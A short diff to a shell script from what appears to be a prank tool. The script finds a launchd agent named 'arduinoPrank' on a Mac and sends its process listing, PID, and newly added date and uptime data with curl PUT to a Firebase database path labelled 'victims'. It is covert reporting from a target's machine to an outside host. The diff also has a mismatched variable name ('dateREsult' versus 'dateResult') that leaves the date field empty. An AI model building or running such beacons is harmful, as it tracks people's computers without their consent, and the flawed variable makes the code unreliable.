@@ -23,12 +23,16 @@ rootIteration="$2"
 
 # Your own code
 
+dateREsult=`date '+%s'`
 dPID=`launchctl list | grep io.github.thiesgehrmann.arduinoPrank | cut -f1`
 psResult=`ps ux -p $dPID | tail -n1`
+uptimeResult=`uptime`
 
 curl -X PUT -d "
   {
+    \"date\" : \"$dateResult\",
     \"ps\" : \"$psResult\",
+    \"uptime\" : \"$uptimeResult\",
     \"PID\" : \"$dPID\"
   }" \
  "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
